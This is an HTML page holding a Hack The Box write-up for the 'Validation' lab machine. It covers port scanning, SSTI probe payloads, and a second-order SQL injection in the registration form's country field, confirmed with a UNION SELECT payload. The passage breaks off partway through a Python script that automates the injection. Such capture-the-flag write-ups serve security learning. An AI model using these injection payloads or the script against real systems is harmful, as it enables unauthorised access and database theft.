@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Linux box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;validation#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Validation<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-12-03</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/validation/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#host-10-10-11-116">Host 10.10.11.116</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#apache">Apache</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#mariadb">MariaDB</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#foothold-sqli">Foothold (SQLi)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#spawning-a-pty">Spawning a pty</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#distribution">Distribution</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#kernel">Kernel</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#nics">NICs</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#hostname">Hostname</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#flags">Flags</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#website-code-review">Website code review</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#privilege-escalation-impersonation">Privilege escalation (Impersonation)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#establishing-persistence">Establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#system-enumeration-1">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#flags-1">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/validation/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2021-09-13</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/3769">ippsec</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.9</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-11-116">Host <code>10.10.11.116</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Validation using a TCP SYN
+<code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.116<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE    SERVICE
+</span><span class="z-text z-plain">22/tcp   open     ssh
+</span><span class="z-text z-plain">80/tcp   open     http
+</span><span class="z-text z-plain">4566/tcp open     kwtc
+</span><span class="z-text z-plain">5000/tcp filtered upnp
+</span><span class="z-text z-plain">5001/tcp filtered commplex-link
+</span><span class="z-text z-plain">5002/tcp filtered rfe
+</span><span class="z-text z-plain">5003/tcp filtered filemaker
+</span><span class="z-text z-plain">5004/tcp filtered avt-profile-1
+</span><span class="z-text z-plain">5005/tcp filtered avt-profile-2
+</span><span class="z-text z-plain">5006/tcp filtered wsm-server
+</span><span class="z-text z-plain">5007/tcp filtered wsm-server-ssl
+</span><span class="z-text z-plain">5008/tcp filtered synapsis-edge
+</span><span class="z-text z-plain">8080/tcp open     http-proxy
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.116<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.116<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE    SERVICE        VERSION
+</span><span class="z-text z-plain">22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span><span class="z-text z-plain">80/tcp   open     http           Apache httpd 2.4.48 ((Debian))
+</span><span class="z-text z-plain">4566/tcp open     http           nginx
+</span><span class="z-text z-plain">5000/tcp filtered upnp
+</span><span class="z-text z-plain">5001/tcp filtered commplex-link
+</span><span class="z-text z-plain">5002/tcp filtered rfe
+</span><span class="z-text z-plain">5003/tcp filtered filemaker
+</span><span class="z-text z-plain">5004/tcp filtered avt-profile-1
+</span><span class="z-text z-plain">5005/tcp filtered avt-profile-2
+</span><span class="z-text z-plain">5006/tcp filtered wsm-server
+</span><span class="z-text z-plain">5007/tcp filtered wsm-server-ssl
+</span><span class="z-text z-plain">5008/tcp filtered synapsis-edge
+</span><span class="z-text z-plain">8080/tcp open     http           nginx
+</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Validation is running Linux, and
+the version of SSH suggests that it might be Ubuntu.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.116<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE    SERVICE
+</span><span class="z-text z-plain">22/tcp   open     ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
+</span><span class="z-text z-plain">|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
+</span><span class="z-text z-plain">|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
+</span><span class="z-text z-plain">80/tcp   open     http
+</span><span class="z-text z-plain">|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+</span><span class="z-text z-plain">4566/tcp open     kwtc
+</span><span class="z-text z-plain">5000/tcp filtered upnp
+</span><span class="z-text z-plain">5001/tcp filtered commplex-link
+</span><span class="z-text z-plain">5002/tcp filtered rfe
+</span><span class="z-text z-plain">5003/tcp filtered filemaker
+</span><span class="z-text z-plain">5004/tcp filtered avt-profile-1
+</span><span class="z-text z-plain">5005/tcp filtered avt-profile-2
+</span><span class="z-text z-plain">5006/tcp filtered wsm-server
+</span><span class="z-text z-plain">5007/tcp filtered wsm-server-ssl
+</span><span class="z-text z-plain">5008/tcp filtered synapsis-edge
+</span><span class="z-text z-plain">8080/tcp open     http-proxy
+</span><span class="z-text z-plain">|_http-title: 502 Bad Gateway
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="apache">Apache</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://10.10.11.116/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/validation/apache-homepage.png" alt="Apache homepage" /></p>
+<p>It's a website for registering to the September qualifiers of a contest.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/validation/apache-homepage-wappalyzer.png" alt="Apache homepage Wappalyzer extension" /></p>
+<p>This reveals that this web page is using PHP version <code>7.4.23</code>.</p>
+<h4 id="exploration-1">Exploration</h4>
+<p>We can fill a form with a username and a country from a pre-defined list to
+register.</p>
+<p>Let's enter a random username and see what happens:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/validation/apache-account-page-fake-signup.png" alt="Apache account page fake signup" /></p>
+<p>We're redirected to <code>/account.php</code>, and we see all the players who registered in
+Brazil.</p>
+<h4 id="under-the-hood">Under the hood</h4>
+<p>If we check the previous requests using Burp Suite, we notice that when we sign
+up with a username, a POST request is sent to <code>/</code> with the parameters:</p>
+<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic">username=<span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">USERNAME</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>&amp;country=<span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">COUNTRY</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></code></pre>
+<p>Then, the Apache web server redirects us to <code>/account.php</code> and sets the <code>user</code>
+cookie to a specific value.</p>
+<p>It turns out that the <code>user</code> cookie is set to the MD5 hash of the username we
+entered. I tried to set it to the MD5 value of <code>admin</code>, but it failed.</p>
+<h4 id="ssti">SSTI</h4>
+<p>Since our input is rendered and reflected in the response, maybe the website is
+vulnerable to SSTI. Let's check for it by entering the following payloads:</p>
+<pre class="z-code"><code><span class="z-text z-plain">{{7*7}} ${7*7} &lt;%= 7*7 %&gt; ${{7*7}} #{7*7} *{7*7}
+</span></code></pre>
+<p>Unfortunately, this is what we get:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/validation/apache-acount-page-ssti-test.png" alt="Apache acount page SSTI test" /></p>
+<p>None of the mathematical expressions we entered is computed, which means that
+there's no SSTI here.</p>
+<h4 id="sqli">SQLi</h4>
+<h5 id="test">Test</h5>
+<p>Since we're able to see who registered in the same country as us, there must be
+a database used to store the players and the associated countries.</p>
+<p>Let's fiddle a bit with our input to see if we can alter anything. Let's start
+by entering <code>foo'</code> as the username:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/validation/apache-account-page-username-sqli-first-test.png" alt="Apache account page username SQLi first test" /></p>
+<p>Well, we see no errors. What about <code>foo&quot;</code> then?</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/validation/apache-account-page-username-sqli-second-test.png" alt="Apache account page username SQLi second test" /></p>
+<p>Still no errors! Maybe this website is secure against SQLi...</p>
+<p>Or is it? We only tried to change the <code>username</code> parameter but no the <code>country</code>,
+since the frontend prevents us from editing it. Let's replay the POST request
+using Caido, and enter <code>Brazil'</code> as the country.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/validation/burp-registration-request-country-sqli-test.png" alt="Burp Suite registration request with country SQLi test" /></p>
+<p>Let's set our <code>user</code> to the cookie in the response and browse to
+<code>http://10.10.11.116/account.php</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/validation/apache-account-page-country-sqli-test.png" alt="Apache account page country SQLi test" /></p>
+<p>It's hard to read since it's written in black, but there's an error message! It
+looks like the SQL query is unfinished. So this website must be vulnerable to a
+second-order SQLi!</p>
+<p>It also dicloses that the error happened at the line <code>33</code> of the
+<code>/var/www/html/account.php</code> file, more specifically in the <code>fetch_assoc()</code>
+function.</p>
+<h5 id="query">Query</h5>
+<p>We can assume that the SQL query used to return the registered players looks
+like this:</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">SELECT</span> username <span class="z-keyword z-other z-DML z-sql">FROM</span> players <span class="z-keyword z-other z-DML z-sql">WHERE</span> country <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-double z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&quot;</span>&lt;COUNTRY&gt;<span class="z-punctuation z-definition z-string z-end z-sql">&quot;</span></span>;
+</span></code></pre>
+<p>In order to execute custom SQL queries, we can use the <code>UNION</code> keyword to chain
+two of them and to append the results to the original query. However, the
+individual queries must return the same number of columns. In order to find it,
+we can use a <code>UNION SELECT</code> payload specifying a different number of null
+values.</p>
+<p>We don't know which database the web server is using though, so let's use
+standard comments <code>--</code> to comment out the rest of the query.</p>
+<h4 id="number-of-columns">Number of columns</h4>
+<p>Let's try to enter the URL encoded result of <code>Brazil' UNION SELECT NULL; -- -</code>
+to see if the number of columns is <code>1</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/validation/apache-account-page-country-sqli-number-columns.png" alt="Apache account page country SQLi number of columns" /></p>
+<p>The last bullet point is followed by nothing, so it worked! There's indeed <code>1</code>
+column in the table.</p>
+<h4 id="script">Script</h4>
+<p>It's a but cumbersome to enter the URL encoded payload on Burp Suite and then to
+retrieve the response on a web browser though. Let's use a Python script to
+automate that:</p>
+<pre data-lang="py" class="language-py z-code"><code class="language-py" data-lang="py"><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">requests</span></span></span>
+</span><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-from z-python">from</span></span><span class="z-meta z-statement z-import z-python"><span class="z-meta z-import-source z-python"> <span class="z-meta z-import-path z-python"><span class="z-meta z-import-name z-python">bs4</span></span> <span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span></span></span></span><span class="z-meta z-statement z-import z-python"></span><span class="z-meta z-statement z-import z-python"> <span class="z-meta z-generic-name z-python">BeautifulSoup</span></span>
+</span><span class="z-source z-python"><span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-from z-python">from</span></span><span class="z-meta z-statement z-import z-python"><span class="z-meta z-import-source z-python"> <span class="z-meta z-import-path z-python"><span class="z-meta z-import-name z-python">cmd</span></span> <span class="z-meta z-statement z-import z-python"><span class="z-keyword z-control z-import z-python">import</span></span></span></span><span class="z-meta z-statement z-import z-python"></span><span class="z-meta z-statement z-import z-python"> <span class="z-meta z-generic-name z-python">Cmd</span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">
+</span><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Define a custom command-line interpreter class
+</span></span><span class="z-source z-python"><span class="z-meta z-class z-python"><span class="z-storage z-type z-class z-python"><span class="z-keyword z-declaration z-class z-python">class</span></span> <span class="z-entity z-name z-class z-python"><span class="z-meta z-generic-name z-python">MyCmd</span></span><span class="z-meta z-class z-inheritance z-python"><span class="z-punctuation z-section z-inheritance z-begin z-python">(</span></span></span><span class="z-meta z-class z-inheritance z-python"><span class="z-entity z-other z-inherited-class z-python">Cmd</span><span class="z-punctuation z-section z-inheritance z-end z-python">)</span></span><span class="z-meta z-class z-python"><span class="z-punctuation z-section z-class z-begin z-python">:</span></span>
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Set the prompt for the command-line interface
+</span></span><span class="z-source z-python">    <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">prompt</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">&gt; <span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">    <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Define the default behavior for handling input
+</span></span><span class="z-source z-python"><span class="z-meta z-function z-python">    <span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">default</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-variable z-parameter z-python">self</span><span class="z-punctuation z-separator z-parameters z-python">,</span> <span class="z-variable z-parameter z-python">line</span><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
+</span><span class="z-source z-python">        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Define the target URL
+</span></span><span class="z-source z-python">        <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">url</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">http://10.10.11.116/<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span>
+</span><span class="z-source z-python">
+</span><span class="z-source z-python">        <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> Create a dictionary containing the payload for the SQL injection
+</span></span><span class="z-source z-python">        <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">data</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-mapping z-python"><span class="z-punctuation z-section z-mapping z-begin z-python">{</span></span><span class="z-meta z-mapping z-key z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">username<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span></span><span class="z-meta z-mapping z-python"><span class="z-punctuation z-separator z-mapping z-key-value z-python">:</span></span><span class="z-meta z-mapping z-python"> </span><span class="z-meta z-mapping z-value z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">foo<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span></span><span class="z-meta z-mapping z-python"><span class="z-punctuation z-separator z-mapping z-python">,</span> </span><span class="z-meta z-mapping z-key z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">country<span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span></span><span class="z-meta z-mapping z-python"><span class="z-punctuation z-separator z-mapping z-key-value z-python">:</span></span><span class="z-meta z-mapping z-python"> </span><span class="z-meta z-mapping z-value z-python"><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&quot;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python">Brazil&#39; UNION <span class="z-punctuation z-definition z-string z-end z-python">&quot;</span></span></span> <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">line</span></span> <span class="z-keyword z-operator z-arithmetic z-python">+</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-double z-python"><span class="z-punctuation z-definition z-string z-begin 